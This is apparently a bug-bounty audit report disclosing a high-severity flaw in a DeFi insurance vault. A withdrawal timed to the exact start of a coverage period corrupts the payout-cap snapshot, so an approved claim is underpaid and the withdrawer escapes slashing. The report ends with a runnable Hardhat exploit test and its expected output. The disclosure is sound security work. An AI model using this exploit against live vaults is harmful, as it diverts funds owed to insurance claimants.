# 89315 sc high boundary timestamp withdrawal corrupts the period payout cap allowing a shareholder to evade slashing and permanently underpay an approved claim

## #89315 \[SC-High] Boundary-timestamp withdrawal corrupts the period payout cap, allowing a shareholder to evade slashing and permanently underpay an approved claim

**Submitted on Aug 18th 2026 at 14:50:17 UTC by @Bug73803 for** [**Audit Comp | Firelight**](https://immunefi.com/audit-competition/audit-comp-firelight-1)

* **Report ID:** #89315
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-firelight/blob/v1\\_audit\\_ready/contracts/core/FirelightVault.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

### Description

### Brief / Intro

An ordinary `FirelightVault` shareholder can request a withdrawal in a block whose timestamp is exactly the beginning of a coverage period. The withdrawal is booked into that new period's still-slashable withdrawal bucket, but its post-withdrawal asset checkpoint overwrites the checkpoint at the period-start timestamp. This removes the withdrawal from `totalAssetsAt(capturePeriodStart)`, which is the maximum amount `payout()` will pay, while the same withdrawal remains included in `activePayableAmount` and is expressly intended to absorb incidents captured during that period. A later approved claim is therefore capped below the assets that remain slashable. `IncidentManager` accepts the partial return and closes the incident, permanently underpaying the claimant while allowing the boundary withdrawer to claim more assets than the intended proportional slash permits.

### Vulnerability Details

#### Threat model

The manipulating party is an ordinary vault shareholder. The attacker needs no Firelight role and calls the public `withdraw()` or `redeem()` entry point.

All permissioned actors may behave honestly:

* the allocator commits and settles a valid allocation;
* the curator creates and assesses a genuine covered incident;
* the assessment approver approves a loss within the settled cover amount; and
* `IncidentManager`, holding `PAYOUT_ROLE`, executes the approved payout.

The attack does not depend on an unfunded first-loss buffer, an excessive assessment, duplicate claims, a depegged token, or a compromised trusted role.

#### 1. A transaction at the boundary already belongs to the new period

`periodAtTimestamp()` assigns a timestamp to a period using integer division:

```solidity
function periodAtTimestamp(uint48 timestamp) public view returns (uint256) {
    PeriodConfiguration memory periodConfiguration = periodConfigurationAtTimestamp(timestamp);
    return periodConfiguration.startingPeriod
        + _timestampSinceEpoch(timestamp, periodConfiguration.epoch)
            / periodConfiguration.duration;
}
```

Let `T0` be the exact start timestamp of period `P`. At `block.timestamp == T0`, the transaction executes in period `P`, not `P-1`.

#### 2. A boundary withdrawal writes its post-withdrawal amount under key `T0`

`withdraw()` requests the withdrawal and then checkpoints the post-withdrawal totals:

```solidity
(uint256 shares, uint256 _totalSupply, uint256 _totalAssets) =
    _previewTotals(assets, true, Math.Rounding.Ceil);

uint256 ownerBalance = _requestWithdraw(assets, shares, receiver, owner);

_logTrace(owner, ownerBalance, _totalSupply - shares, _totalAssets - assets, true);
```

`_logTrace()` uses the current second as the checkpoint key:

```solidity
uint48 ts = Time.timestamp();
_traceBalanceOf[owner].push(ts, balance);
_traceTotalSupply.push(ts, _totalSupply);

if (isLogAssets) _traceTotalAssets.push(ts, _totalAssets);
```

When the supplied key equals the latest checkpoint key, `Checkpoints.push()` replaces the stored value:

```solidity
if (exists && key == lastKey) {
    self._values[len - 1] = value;
} else {
    self._trace.push(key, uint208(len));
    self._values.push(value);
}
```

Consequently, a withdrawal executing at `T0` can define the value returned by `totalAssetsAt(T0)` for the entire period.

#### 3. The withdrawal is removed from the snapshot but remains slashable

Because the transaction executes in period `P`, `_requestWithdraw()` books it into `P+1`:

```solidity
uint256 period = currentPeriod() + 1;

withdrawAssets[period] += assets;
withdrawShares[period] += sharesWithdraw;
withdrawSharesOf[period][receiver] += sharesWithdraw;
pendingWithdrawAssets += assets;
```

Pending withdrawals are excluded from active `totalAssets()`:

```solidity
function totalAssets() public view override returns (uint256) {
    return super.totalAssets() - pendingWithdrawAssets;
}
```

If the vault had `A` assets and the attacker requests `X`, the checkpoint written at `T0` is therefore:

```
totalAssetsAt(T0) = A - X
```

However, `payout()` expressly treats withdrawals requested during the capture period as payable and slashable:

```solidity
uint256 capturePeriodWithdrawals = withdrawAssets[capturePeriod + 1];

uint256 activePayableAmount =
    currentActiveAssets
    + capturePeriodWithdrawals
    + nextPeriodWithdrawals;
```

Immediately after the boundary withdrawal:

```
assetsAtCapturePeriod = A - X
activePayableAmount   = (A - X) + X = A
```

The same `X` is excluded from the payout ceiling while remaining in the set that the payout is intended to slash.

#### 4. The corrupted snapshot caps the payout before the slashable set can be charged

`payout()` uses both values, but the smaller corrupted snapshot binds first:

```solidity
uint256 assetsAtCapturePeriod = totalAssetsAt(capturePeriodStart);

paidAmount = Math.min(
    amount,
    Math.min(assetsAtCapturePeriod, activePayableAmount)
);
```

Let:

```
A = assets entering the covered period
X = boundary withdrawal
L = approved vault-funded loss after the first-loss-buffer leg
B = actual vault payout
```

Then:

```
B = min(L, A - X)
```

The vulnerability becomes economically effective when:

```
L > A - X

equivalently:

X > A - L
```

Ignoring integer rounding, the additional amount preserved by the attacker is:

```
attacker preserved assets = X * (L - B) / A
```

The required position depends on the size of the legitimate vault-funded loss:

```
Vault-funded loss = 20% of A  -> attacker must withdraw more than 80% of A
Vault-funded loss = 50% of A  -> attacker must withdraw more than 50% of A
Vault-funded loss = 80% of A  -> attacker must withdraw more than 20% of A
Vault-funded loss = 90% of A  -> attacker must withdraw more than 10% of A
```

#### 5. IncidentManager permanently closes the underpaid claim

`IncidentManager` converts the approved residual loss into vault-asset units and calls the vulnerable payout:

```solidity
if (vaultRequestedAmount > 0) {
    vaultPaidAmount = $.vault.payout(
        receiver,
        vaultRequestedAmount,
        captureTimestamp
    );
}
```

`FirelightVault.payout()` is allowed to return less than requested. `approveCurrentAssessment()` records the returned partial amount and closes the incident without recording the unpaid remainder:

```solidity
if (vaultPaidAmount > 0) incident.vaultPaidAmount = vaultPaidAmount;

incident.status = IncidentStatus.CLOSED;
_decreaseIncident(incident.period);
```

The claim shortfall is therefore permanent. The excess assets remain allocated to the pending withdrawal and can later be claimed by the attacker once its bucket matures.

### Impact Details

The selected impact is **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**.

The attacker obtains an economic benefit rather than merely causing grief. By reducing the amount charged to the pending withdrawal, the attacker later receives assets that should have been consumed by the approved incident payout. The covered claimant receives correspondingly less than the approved vault-funded loss.

The runnable PoC establishes:

```
Vault assets before boundary withdrawal                 = 1,000
Attacker boundary withdrawal                            =   900
Active assets after withdrawal                          =   100
Pending withdrawal still exposed to the incident        =   900
Actual slashable/payable set                            = 1,000
Corrupted totalAssetsAt(capturePeriodStart)              =   100

Approved total covered loss                             =   250
Healthy and approved first-loss-buffer payment           =    50
Approved vault-funded remainder                         =   200
Actual vault payment due to corrupted cap               =   100
Permanent claimant shortfall                            =   100

Attacker claim after vulnerable payout                  =   810
Attacker claim after the intended 200-asset payout       =   720
Assets preserved by attacker                            =    90
```

The missing 100-asset vault payment remains inside the vault accounting: approximately 90 benefits the attacker's withdrawal and 10 remains with active shareholders. This is a direct redistribution away from the approved claimant caused by the attacker's unprivileged boundary transaction.

This is distinct from the disclosed aggregate-claims issue. The PoC creates one assessment of exactly `$250` against a CoverNFT with exactly `$250` of settled allocation. The assessment is neither duplicated nor excessive. It is also distinct from the disclosed first-loss-buffer assumptions: the buffer contains 50 assets, has granted the required allowance, and pays its complete tranche successfully before the vulnerable vault leg executes.

### Feasibility Limitations

The report does not claim deterministic exploitation in every period. The following conditions are required:

1. A block must have timestamp exactly equal to the deterministic period boundary `T0`.
2. The attacker's withdrawal must execute in that block, and no later asset flow with the same timestamp may replace the checkpoint with a non-beneficial value.
3. The attacker must hold a sufficiently large vault position relative to the vault-funded incident loss, as described by `X > A - L`.
4. A genuine covered incident must occur in the affected period and produce a vault-funded loss larger than the corrupted snapshot after the first-loss-buffer leg.
5. Sufficient settled cover must exist for the assessed loss.
6. Later payouts for the same period may reduce or eliminate the preserved amount before the withdrawal matures.

These conditions affect likelihood, but not the demonstrated impact after successful execution. The attack does not require the attacker to compromise or collude with a Firelight role. Missing the advantageous incident does not destroy the withdrawal principal; the attacker completes an ordinary delayed withdrawal, subject to the vault's normal incident exposure.

### Proof of Concept

#### Step-by-step reproduction

1. Deploy the legacy vault proxy with a six-decimal FAsset and a seven-day period. Upgrade the same proxy to V2 using `initializeV2()`.
2. Deploy `CoverNFT`, `CoverOrderAllocator`, a `$1` price adapter, and `IncidentManager`. Wire the required roles normally. Configure:

   ```
   minCAR            = 12,000
   effectiveLeverage = 24,000
   capacity multiple = 2x
   first-loss buffer = 50 assets, funded and approved
   ```
3. Deposit 900 assets for the attacker and 100 for another shareholder. Create a `$250` order targeting the next period.
4. Read the deterministic boundary:

   ```javascript
   const boundary = await vault.currentPeriodEnd();
   ```
5. Set the next local block timestamp to `boundary` and execute the attacker's ordinary withdrawal:

   ```javascript
   await time.setNextBlockTimestamp(boundary);
   await vault
       .connect(attacker)
       .withdraw(900n * ASSET_UNIT, attacker.address, attacker.address);
   ```
6. Observe the corrupted historical state and the still-exposed withdrawal:

   ```
   totalAssetsAt(boundary - 1) = 1,000 assets
   totalAssetsAt(boundary)     =   100 assets
   withdrawAssets[P + 1]       =   900 assets
   ```
7. Commit and settle the valid `$250` cover allocation and verify that CoverNFT ID 0 is minted to the buyer.
8. Create an incident at `boundary`, confirm it, add one `$250` assessment loss against the `$250` settled market allocation, and submit it.
9. Approve the assessment. The healthy first-loss buffer transfers 50 assets, after which `IncidentManager` requests 200 from the vault. The corrupted snapshot limits the vault payment to 100:

   ```
   receiver increase       = 150 assets
   expected total payout   = 250 assets
   permanent shortfall     = 100 assets
   incident.vaultPaidAmount = 100 assets
   ```
10. Observe that the attacker's pending withdrawal is reduced from 900 only to 810. Advance until the bucket matures and claim 810. With the intended complete 200-asset vault payout, proportional charging would have left the attacker only 720.

## Runnable Proof of Concept

Save the following file as `test/boundary_second_withdraw_realistic.poc.js`.

```javascript
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { loadFixture, time } = require("@nomicfoundation/hardhat-network-helpers");
const { StandardMerkleTree } = require("@openzeppelin/merkle-tree");
const { deployFAsset } = require("../lib/utils_test.js");

describe("PoC: boundary withdrawal evades incident slashing", function () {
  const ASSET_UNIT = 10n ** 6n;
  const USD_UNIT = 10n ** 18n;
  const ATTACKER_DEPOSIT = 900n * ASSET_UNIT;
  const HONEST_DEPOSIT = 100n * ASSET_UNIT;
  const TOTAL_DEPOSIT = ATTACKER_DEPOSIT + HONEST_DEPOSIT;
  const FIRST_LOSS_BUFFER = 50n * ASSET_UNIT;
  const COVER = 250n * USD_UNIT;
  const LOSS = 250n * USD_UNIT;
  const PERIOD_DURATION = 7 * 24 * 60 * 60;

  async function fixture() {
    const signers = await ethers.getSigners();
    const deployer = signers[0];
    const limitUpdater = signers[1];
    const blocklister = signers[2];
    const pauser = signers[3];
    const periodConfigurationUpdater = signers[4];
    const rescuer = signers[5];
    const payoutAllowlister = signers[6];
    const payoutReceiver = signers[7];
    const attacker = signers[8];
    const honestDepositor = signers[9];
    const buyer = signers[10];
    const curator = signers[11];
    const allocatorRole = signers[12];
    const adminRole = signers[13];
    const configAdmin = signers[14];
    const premiumCollector = signers[15];
    const firstLossBuffer = signers[16];

    const { token_contract } = await deployFAsset(["fXRP", "fXRP", "Ripple", "XRP", 6]);
    const initParams = ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "address", "address", "address", "address", "address", "uint256", "uint48"],
      [
        deployer.address,
        limitUpdater.address,
        blocklister.address,
        pauser.address,
        periodConfigurationUpdater.address,
        rescuer.address,
        2_000n * ASSET_UNIT,
        PERIOD_DURATION,
      ],
    );

    // Reproduce the actual deployment context: initialize the legacy vault,
    // preserve its proxy/storage, and upgrade that proxy to V2.
    const LegacyVault = await ethers.getContractFactory("FirelightVaultPredeposits");
    const legacyVault = await upgrades.deployProxy(
      LegacyVault,
      [token_contract.target, "stfXRP", "stfXRP", initParams],
      { kind: "transparent" },
    );
    const FirelightVaultV2 = await ethers.getContractFactory("FirelightVault");
    const firelight_vault = await upgrades.upgradeProxy(legacyVault.target, FirelightVaultV2, {
      call: { fn: "initializeV2", args: [] },
    });

    await firelight_vault
      .connect(deployer)
      .grantRole(await firelight_vault.PAYOUT_ALLOWLIST_ROLE(), payoutAllowlister.address);
    await firelight_vault.connect(payoutAllowlister).addToPayoutAllowlist(payoutReceiver.address);

    const ctx = {
      token_contract,
      firelight_vault,
      deployer,
      payout_receiver: payoutReceiver,
      config: { period_configuration_duration: PERIOD_DURATION },
      utils: {
        mintAndApprove: async (amount, user) => {
          await token_contract.mintTo(user.address, amount);
          await token_contract.connect(user).approve(firelight_vault.target, amount);
        },
      },
    };

    const PriceFeed = await ethers.getContractFactory("MockAggregatorV3");
    const priceFeed = await PriceFeed.deploy(18, USD_UNIT); // $1 per vault asset

    const CoverNFT = await ethers.getContractFactory("CoverNFT");
    const coverNFT = await upgrades.deployProxy(
      CoverNFT,
      [
        "Firelight Cover",
        "FLCOVER",
        "",
        ctx.deployer.address,
        ethers.ZeroAddress,
        ethers.ZeroAddress,
        ethers.ZeroAddress,
      ],
      { kind: "transparent" },
    );

    const market = {
      chainId: 1,
      protocol: "Protocol-A",
      market: ethers.encodeBytes32String("market-A"),
    };
    const marketId = ethers.keccak256(
      ethers.AbiCoder.defaultAbiCoder().encode(
        ["uint64", "string", "bytes32"],
        [market.chainId, market.protocol, market.market],
      ),
    );

    const Allocator = await ethers.getContractFactory("CoverOrderAllocator");
    const allocator = await upgrades.deployProxy(
      Allocator,
      [
        {
          vault: ctx.firelight_vault.target,
          premiumCollector: premiumCollector.address,
          coverNFT: coverNFT.target,
          priceFeedAdapter: priceFeed.target,
          maxPriceAge: 365 * 24 * 60 * 60,
          premiumTokens: [ctx.token_contract.target],
          admin: ctx.deployer.address,
          adminRole: adminRole.address,
          curatorRole: curator.address,
          allocatorRole: allocatorRole.address,
          configAdminRole: configAdmin.address,
          initialProtocolConcentrations: [
            {
              protocol: market.protocol,
              chainId: market.chainId,
              maxProtocolConcentrationBps: 10_000,
            },
          ],
          newMarkets: [market],
          capacityConfig: {
            minCAR: 12_000,
            firstLossBufferToken: ctx.token_contract.target,
            firstLossBuffer: firstLossBuffer.address,
            effectiveLeverage: 24_000, // 2x capacity
            minOrderMarketCoverAmount: 1,
            divergenceToleranceBps: 0,
          },
        },
      ],
      { kind: "transparent", unsafeAllow: ["missing-initializer-call"] },
    );

    await coverNFT.connect(ctx.deployer).grantRole(await coverNFT.MINTER_ROLE(), allocator.target);

    const IncidentManager = await ethers.getContractFactory("IncidentManager");
    const incidentManager = await upgrades.deployProxy(
      IncidentManager,
      [
        ctx.deployer.address,
        ctx.deployer.address,
        ctx.deployer.address,
        ctx.deployer.address,
        ctx.deployer.address,
        ethers.ZeroAddress,
        ethers.ZeroAddress,
        ethers.ZeroAddress,
        ctx.payout_receiver.address,
        allocator.target,
        priceFeed.target,
        365 * 24 * 60 * 60,
      ],
      { kind: "transparent" },
    );

    await ctx.firelight_vault
      .connect(ctx.deployer)
      .grantRole(await ctx.firelight_vault.PAYOUT_ROLE(), incidentManager.target);
    await ctx.firelight_vault
      .connect(ctx.deployer)
      .grantRole(await ctx.firelight_vault.INCIDENT_ROLE(), incidentManager.target);

    // The first-loss tranche is funded and has granted the required allowance.
    await ctx.token_contract.mintTo(firstLossBuffer.address, FIRST_LOSS_BUFFER);
    await ctx.token_contract
      .connect(firstLossBuffer)
      .approve(incidentManager.target, FIRST_LOSS_BUFFER);

    await ctx.utils.mintAndApprove(ATTACKER_DEPOSIT, attacker);
    await ctx.firelight_vault.connect(attacker).deposit(ATTACKER_DEPOSIT, attacker.address);
    await ctx.utils.mintAndApprove(HONEST_DEPOSIT, honestDepositor);
    await ctx.firelight_vault.connect(honestDepositor).deposit(HONEST_DEPOSIT, honestDepositor.address);

    // A period-N order targets N+1, the period whose boundary is attacked.
    await allocator
      .connect(curator)
      .createCoverOrder(
        buyer.address,
        buyer.address,
        buyer.address,
        ctx.token_contract.target,
        [{ marketId, coverRateAnnual: 1_000, coverAmount: COVER }],
        0,
      );
    await ctx.token_contract.mintTo(buyer.address, 10n * ASSET_UNIT);
    await ctx.token_contract.connect(buyer).approve(allocator.target, 10n * ASSET_UNIT);

    return {
      ...ctx,
      attacker,
      allocator,
      allocatorRole,
      coverNFT,
      incidentManager,
      marketId,
      buyer,
    };
  }

  it("pays the buffer but caps the 200-asset vault leg at 100, preserving 90 for the attacker", async function () {
    const ctx = await loadFixture(fixture);

    expect(await ctx.firelight_vault.totalAssets()).to.equal(TOTAL_DEPOSIT);

    // Execute the unprivileged withdrawal in the exact second at which the
    // covered period begins. Its post-state overwrites the boundary checkpoint.
    const boundary = await ctx.firelight_vault.currentPeriodEnd();
    await time.setNextBlockTimestamp(boundary);
    await ctx.firelight_vault
      .connect(ctx.attacker)
      .withdraw(ATTACKER_DEPOSIT, ctx.attacker.address, ctx.attacker.address);

    const period = await ctx.firelight_vault.currentPeriod();
    expect(await ctx.firelight_vault.currentPeriodStart()).to.equal(boundary);
    expect(await ctx.firelight_vault.totalAssetsAt(boundary - 1n)).to.equal(TOTAL_DEPOSIT);
    expect(await ctx.firelight_vault.totalAssetsAt(boundary)).to.equal(HONEST_DEPOSIT);
    expect(await ctx.firelight_vault.withdrawAssets(period + 1n)).to.equal(ATTACKER_DEPOSIT);

    // The corrupted 100 active assets plus the healthy 50-asset buffer provide
    // $300 capacity at 2x. Commit and settle $250 of valid cover.
    const allocations = [[ctx.marketId, COVER]];
    const tree = StandardMerkleTree.of([[0n, allocations]], ["uint256", "(bytes32,uint256)[]"]);
    await ctx.allocator.connect(ctx.allocatorRole).commitAllocation(period, tree.root, COVER, COVER);
    await ctx.allocator
      .connect(ctx.allocatorRole)
      .settleCoverOrder(0, [{ marketId: ctx.marketId, allocatedCover: COVER }], tree.getProof(0));
    expect(await ctx.coverNFT.ownerOf(0)).to.equal(ctx.buyer.address);

    // Process the loss through the complete IncidentManager lifecycle.
    await ctx.incidentManager
      .connect(ctx.deployer)
      .createIncident(boundary, "Covered loss", ethers.id("boundary-withdraw-loss"));
    await ctx.incidentManager.connect(ctx.deployer).confirmIncident(1, "ipfs://covered-loss");
    await ctx.incidentManager.connect(ctx.deployer).addAssessmentLosses(1, [
      { coverTokenId: 0, marketId: ctx.marketId, amount: LOSS },
    ]);
    await ctx.incidentManager.connect(ctx.deployer).submitCurrentAssessment(1);

    const receiverBefore = await ctx.token_contract.balanceOf(ctx.payout_receiver.address);
    await ctx.incidentManager.connect(ctx.deployer).approveCurrentAssessment(1);
    const receiverAfter = await ctx.token_contract.balanceOf(ctx.payout_receiver.address);

    // The buffer pays 50. The remaining 200 should be vault-funded, but the
    // corrupted snapshot caps that leg at 100. The claimant receives only 150.
    expect(receiverAfter - receiverBefore).to.equal(FIRST_LOSS_BUFFER + HONEST_DEPOSIT);
    const [incident] = await ctx.incidentManager.getIncident(1);
    expect(incident.vaultPaidAmount).to.equal(HONEST_DEPOSIT);
    expect(await ctx.firelight_vault.withdrawAssets(period + 1n)).to.equal(810n * ASSET_UNIT);
    expect(await ctx.firelight_vault.pendingWithdrawAssets()).to.equal(810n * ASSET_UNIT);

    // A complete 200-asset proportional payout would leave the attacker 720.
    // The corrupted cap instead leaves, and permits the attacker to claim, 810.
    await time.increase(ctx.config.period_configuration_duration * 2);
    await expect(ctx.firelight_vault.connect(ctx.attacker).claimWithdraw(period + 1n))
      .to.changeTokenBalances(
        ctx.token_contract,
        [ctx.firelight_vault, ctx.attacker],
        [-810n * ASSET_UNIT, 810n * ASSET_UNIT],
      );
  });
});
```

### Execution

Run from the repository root:

```bash
npm install
npm run compile
npx hardhat test test/boundary_second_withdraw_realistic.poc.js --no-compile
```

Expected result:

```
PoC: boundary withdrawal evades incident slashing
  ✔ pays the buffer but caps the 200-asset vault leg at 100, preserving 90 for the attacker

1 passing
```
